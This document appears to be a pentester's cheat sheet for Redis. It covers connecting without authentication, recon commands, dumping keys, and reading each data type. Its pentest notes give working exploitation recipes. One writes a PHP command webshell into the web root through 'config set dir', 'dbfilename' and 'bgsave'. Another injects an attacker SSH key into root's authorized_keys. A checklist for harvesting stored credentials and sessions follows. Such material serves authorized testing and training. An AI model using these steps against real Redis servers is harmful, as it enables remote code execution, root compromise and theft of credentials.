# Redis Cheat Sheet

Redis — in-memory data store, default port 6379, no authentication by default.

---

## Connecting

```bash
# Connect to Redis
redis-cli -h TARGET_IP

# Connect on non-standard port
redis-cli -h TARGET_IP -p PORT

# Connect with password
redis-cli -h TARGET_IP -a PASSWORD

# One-liner command without interactive shell
redis-cli -h TARGET_IP COMMAND
```

---

## Recon Commands

```bash
# Server info and statistics — version, OS, memory, config
info

# Specific section of info
info server
info clients
info memory
info keyspace

# List all keys in database
keys *

# Count total keys
dbsize

# Get Redis config settings
config get *
config get maxmemory
config get bind

# Check which databases exist and how many keys
info keyspace
```

---

## Working with Keys

```bash
# List all keys
keys *

# Search keys by pattern
keys user*
keys *session*
keys *password*

# Get type of a key
type KEYNAME

# Get value of a string key
get KEYNAME

# Get all fields and values of a hash
hgetall KEYNAME

# Get all members of a set
smembers KEYNAME

# Get all members of a list
lrange KEYNAME 0 -1

# Get TTL (time to live) of a key
ttl KEYNAME

# Check if key exists
exists KEYNAME
```

---

## Key Types and How to Read Them

| Type | Read Command |
|---|---|
| string | `get KEYNAME` |
| hash | `hgetall KEYNAME` |
| list | `lrange KEYNAME 0 -1` |
| set | `smembers KEYNAME` |
| zset (sorted set) | `zrange KEYNAME 0 -1 withscores` |

---

## Writing Data (if you have write access)

```bash
# Set a string value
set KEYNAME "value"

# Set with expiry (seconds)
setex KEYNAME 3600 "value"

# Write to a file on disk (potential RCE path)
config set dir /var/www/html
config set dbfilename shell.php
set payload "<?php system($_GET['cmd']); ?>"
bgsave
```

---

## Database Selection

```bash
# Redis has 16 databases (0-15) by default
# Switch to a different database
select 0
select 1

# Check all databases for keys
info keyspace
```

---

## Authentication

```bash
# If auth is required
auth PASSWORD

# Check if password required (no error = no auth needed)
ping
```

---

## Pentest Notes

**Why Redis matters:**
- No auth by default — common misconfiguration
- Stores sessions, tokens, cached credentials in plaintext
- Write access can lead to RCE via webshell or SSH key injection

**SSH Key Injection (if write access + SSH running):**
```bash
# Generate key pair on attacker machine
ssh-keygen -t rsa

# On Redis
config set dir /root/.ssh
config set dbfilename authorized_keys
set payload "\n\nPUBLIC_KEY_HERE\n\n"
bgsave

# Connect
ssh -i id_rsa root@TARGET_IP
```

**Webshell injection (if write access + web server):**
```bash
config set dir /var/www/html
config set dbfilename shell.php
set shell "<?php system($_GET['cmd']); ?>"
bgsave
# Access at http://TARGET_IP/shell.php?cmd=whoami
```

---

## Quick Pentest Checklist

- [ ] Connect without credentials — `redis-cli -h TARGET_IP`
- [ ] Run `ping` — if PONG, no auth required
- [ ] Run `info` — get server details, version, OS
- [ ] Run `keys *` — dump all key names
- [ ] Check key types and read values
- [ ] Check `info keyspace` for multiple databases
- [ ] Select each database and check for keys
- [ ] Check config for file write paths
